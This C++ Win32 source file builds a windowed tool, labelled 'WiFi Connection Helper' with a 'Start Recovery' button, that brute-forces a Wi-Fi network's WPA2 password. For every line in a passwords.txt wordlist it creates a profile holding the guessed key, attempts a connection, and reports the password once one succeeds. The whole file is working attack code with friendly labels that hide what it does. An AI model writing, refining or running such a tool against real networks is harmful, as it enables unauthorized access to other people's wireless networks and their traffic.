#include <windows.h>
#include <wlanapi.h>
#include <commctrl.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <fstream>
#include <thread>
#include <chrono>
#include <algorithm>
#include <shellapi.h>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")

// Глобальные переменные
HWND hWnd, hEdit, hList, hButton, hStatus;
std::wstring currentSSID;
bool isRunning = false;
bool stopRequested = false;
int attemptsCount = 0;
int successCount = 0;

bool ConnectToWifi(const std::wstring& ssid, const std::wstring& password) {
    HANDLE hClient = NULL;
    DWORD dwMaxClient = 2;
    DWORD dwCurVersion = 0;
    DWORD dwResult = 0;
    bool connected = false;

    dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
    if (dwResult != ERROR_SUCCESS) {
        return false;
    }

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwResult != ERROR_SUCCESS) {
        WlanCloseHandle(hClient, NULL);
        return false;
    }

    if (pIfList->dwNumberOfItems > 0) {
        const GUID& interfaceGuid = pIfList->InterfaceInfo[0].InterfaceGuid;

        WlanDisconnect(hClient, &interfaceGuid, NULL);
        std::this_thread::sleep_for(std::chrono::milliseconds(200));

        std::wstring profileXml = L"<?xml version=\"1.0\"?>"
            L"<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">"
            L"<name>" + ssid + L"</name>"
            L"<SSIDConfig>"
            L"<SSID>"
            L"<name>" + ssid + L"</name>"
            L"</SSID>"
            L"</SSIDConfig>"
            L"<connectionType>ESS</connectionType>"
            L"<connectionMode>auto</connectionMode>"
            L"<MSM>"
            L"<security>"
            L"<authEncryption>"
            L"<authentication>WPA2PSK</authentication>"
            L"<encryption>AES</encryption>"
            L"<useOneX>false</useOneX>"
            L"</authEncryption>"
            L"<sharedKey>"
            L"<keyType>passPhrase</keyType>"
            L"<protected>false</protected>"
            L"<keyMaterial>" + password + L"</keyMaterial>"
            L"</sharedKey>"
            L"</security>"
            L"</MSM>"
            L"</WLANProfile>";

        DWORD dwReason = 0;
        dwResult = WlanSetProfile(hClient, &interfaceGuid, 0, profileXml.c_str(), 
                                NULL, TRUE, NULL, &dwReason);
        
        if (dwResult == ERROR_SUCCESS) {
            WLAN_CONNECTION_PARAMETERS params;
            params.wlanConnectionMode = wlan_connection_mode_profile;
            params.strProfile = ssid.c_str();
            params.pDot11Ssid = NULL;
            params.pDesiredBssidList = NULL;
            params.dot11BssType = dot11_BSS_type_infrastructure;
            params.dwFlags = 0;
            
            dwResult = WlanConnect(hClient, &interfaceGuid, &params, NULL);
            
            if (dwResult == ERROR_SUCCESS) {
                std::this_thread::sleep_for(std::chrono::milliseconds(600));
                
                PWLAN_CONNECTION_ATTRIBUTES pConnectInfo = NULL;
                DWORD connectInfoSize = sizeof(WLAN_CONNECTION_ATTRIBUTES);
                WLAN_OPCODE_VALUE_TYPE opCode = wlan_opcode_value_type_invalid;
                
                dwResult = WlanQueryInterface(hClient, &interfaceGuid, 
                                            wlan_intf_opcode_current_connection,
                                            NULL, &connectInfoSize, 
                                            (PVOID*)&pConnectInfo, &opCode);
                
                if (dwResult == ERROR_SUCCESS && pConnectInfo != NULL) {
                    connected = (pConnectInfo->isState == wlan_interface_state_connected);
                    WlanFreeMemory(pConnectInfo);
                }
            }
        }
    }

    WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);
    
    return connected;
}

void BruteForceThread() {
    isRunning = true;
    stopRequested = false;
    attemptsCount = 0;
    successCount = 0;
    
    if (currentSSID.empty()) {
        SendMessageW(hList, LB_ADDSTRING, 0, (LPARAM)L"ОШИБКА: Введите название сети!");
        isRunning = false;
        return;
    }
    
    std::wifstream file("passwords.txt");
    if (!file.is_open()) {
        SendMessageW(hList, LB_ADDSTRING, 0, (LPARAM)L"ОШИБКА: Не удалось открыть файл passwords.txt");
        isRunning = false;
        return;
    }
    
    std::wstring password;
    while (std::getline(file, password)) {
        if (stopRequested) break;
        
        password.erase(std::remove_if(password.begin(), password.end(), isspace), password.end());
        if (password.empty()) continue;
        
        attemptsCount++;
        
        try {
            if (ConnectToWifi(currentSSID, password)) {
                successCount++;
                std::wstring successMsg = L"УСПЕХ: Пароль найден >>> " + password;
                SendMessageW(hList, LB_ADDSTRING, 0, (LPARAM)successMsg.c_str());
                
                std::wstring statusText = L"Статус: Успех! Пароль: " + password;
                SetWindowTextW(hStatus, statusText.c_str());
                break;
            } else {
                std::wstring failMsg = L"Попытка #" + std::to_wstring(attemptsCount) + 
                                      L": " + password + L" - не подошел";
                SendMessageW(hList, LB_ADDSTRING, 0, (LPARAM)failMsg.c_str());
            }
        } catch (...) {
            SendMessageW(hList, LB_ADDSTRING, 0, (LPARAM)L"ОШИБКА: Проблема при подключении");
        }
        
        SendMessageW(hList, LB_SETTOPINDEX, SendMessageW(hList, LB_GETCOUNT, 0, 0) - 1, 0);
        
        std::wstring statusText = L"Статус: Проверено " + std::to_wstring(attemptsCount) + 
                                 L" паролей | Успех: " + std::to_wstring(successCount);
        SetWindowTextW(hStatus, statusText.c_str());
        
        std::this_thread::sleep_for(std::chrono::milliseconds(30));
    }
    
    file.close();
    isRunning = false;
    
    if (!stopRequested && successCount == 0) {
        SendMessageW(hList, LB_ADDSTRING, 0, (LPARAM)L"ЗАВЕРШЕНО: Подходящий пароль не найден");
    }
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
        case WM_COMMAND: {
            if (LOWORD(wParam) == 1) {
                if (!isRunning) {
                    wchar_t buffer[256];
                    GetWindowTextW(hEdit, buffer, 256);
                    currentSSID = buffer;
                    
                    SendMessageW(hList, LB_RESETCONTENT, 0, 0);
                    
                    std::thread(BruteForceThread).detach();
                }
            } else if (LOWORD(wParam) == 2) {
                stopRequested = true;
            }
            break;
        }
        
        case WM_DESTROY: {
            stopRequested = true;
            PostQuitMessage(0);
            break;
        }
        
        default:
            return DefWindowProcW(hWnd, message, wParam, lParam);
    }
    return 0;
}

int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    // Инициализация Common Controls
    INITCOMMONCONTROLSEX icc;
    icc.dwSize = sizeof(icc);
    icc.dwICC = ICC_STANDARD_CLASSES;
    InitCommonControlsEx(&icc);

    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    wc.lpszClassName = L"WiFiHelper";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    
    if (!RegisterClassW(&wc)) {
        MessageBoxW(NULL, L"Ошибка регистрации класса окна!", L"Ошибка", MB_ICONERROR);
        return 1;
    }

    hWnd = CreateWindowW(L"WiFiHelper", L"WiFi Connection Helper", 
                       WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX,
                       CW_USEDEFAULT, CW_USEDEFAULT, 620, 600, 
                       NULL, NULL, hInstance, NULL);
    
    if (!hWnd) {
        MessageBoxW(NULL, L"Ошибка создания окна!", L"Ошибка", MB_ICONERROR);
        return 1;
    }

    HFONT hFont = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, 
                            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, 
                            DEFAULT_QUALITY, DEFAULT_PITCH, L"Arial");
    
    HFONT hFontBold = CreateFontW(16, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, 
                                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, 
                                DEFAULT_QUALITY, DEFAULT_PITCH, L"Arial");
    
    HWND hLabel = CreateWindowW(L"STATIC", L"WiFi Network Name:", 
                              WS_VISIBLE | WS_CHILD | SS_LEFT,
                              10, 10, 150, 25, hWnd, NULL, hInstance, NULL);
    SendMessageW(hLabel, WM_SETFONT, (WPARAM)hFontBold, TRUE);
    
    hEdit = CreateWindowW(L"EDIT", L"", 
                         WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL,
                         170, 10, 300, 25, hWnd, NULL, hInstance, NULL);
    SendMessageW(hEdit, WM_SETFONT, (WPARAM)hFont, TRUE);
    
    hButton = CreateWindowW(L"BUTTON", L"🔍 Start Recovery", 
                          WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                          170, 45, 150, 35, hWnd, (HMENU)1, hInstance, NULL);
    SendMessageW(hButton, WM_SETFONT, (WPARAM)hFontBold, TRUE);
    
    HWND hStopBtn = CreateWindowW(L"BUTTON", L"🛑 Stop", 
                                WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                                330, 45, 150, 35, hWnd, (HMENU)2, hInstance, NULL);
    SendMessageW(hStopBtn, WM_SETFONT, (WPARAM)hFontBold, TRUE);
    
    hList = CreateWindowW(L"LISTBOX", L"", 
                         WS_VISIBLE | WS_CHILD | WS_BORDER | WS_VSCROLL | LBS_NOTIFY | LBS_HASSTRINGS,
                         10, 90, 590, 400, hWnd, NULL, hInstance, NULL);
    SendMessageW(hList, WM_SETFONT, (WPARAM)hFont, TRUE);
    
    hStatus = CreateWindowW(L"STATIC", L"Status: Ready", 
                          WS_VISIBLE | WS_CHILD | SS_LEFT,
                          10, 500, 590, 25, hWnd, NULL, hInstance, NULL);
    SendMessageW(hStatus, WM_SETFONT, (WPARAM)hFontBold, TRUE);
    
    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);
    
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    
    DeleteObject(hFont);
    DeleteObject(hFontBold);
    
    return (int)msg.wParam;  // Явный возврат значения
}